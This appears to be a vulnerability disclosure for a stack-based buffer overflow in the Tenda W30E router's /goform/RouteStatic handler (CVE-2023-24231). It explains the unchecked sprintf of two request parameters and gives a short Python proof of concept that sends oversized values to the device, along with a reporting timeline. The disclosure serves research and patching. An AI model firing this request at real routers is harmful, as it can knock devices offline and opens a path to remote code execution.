# Tenda Router W30E Vulnerability
This vulnerability lies in the `/goform/RouteStatic` page which influences the lastest version of Tenda Router W30E. (The latest version is [W30E_V1.0.1.25(633)](https://www.tenda.com.cn/download/detail-2218.html))

## Vulnerability Description
There is a stack-based buffer overflow vulnerability in function `fromRouteStatic`.

In function `fromRouteStatic` it reads 2 user provided parameters `entrys` and `mitInterface` into `v8` and `v7`, and these two variables are passed into function `sprintf` without any length check, which may overflow the stack-based buffer `s`.
![](https://github.com/Funcy33/Vluninfo_Repo/blob/main/CNVDs/104/vlun1.png)

So by requesting the page `/goform/RouteStatic`, the attacker can easily perform a **Deny of Service Attack** or **Remote Code Execution** with carefully crafted overflow data.
## POC
```
import requests

IP = "10.10.10.1"
url = f"http://{IP}/goform/RouteStatic?"
url += "entrys=" + "s" * 0x200
url += "&mitInterface=" + "a" * 0x200

response = requests.get(url)
```
## Timeline
2023-01-30: Report to CVE;
2023-2-27: CVE-2023-24231;
2023-02-03：Report to CNVD;
## Acknowledgment
Credit to [@Funcy_kilar](https://github.com/Funcy33) from Guangzhou University.
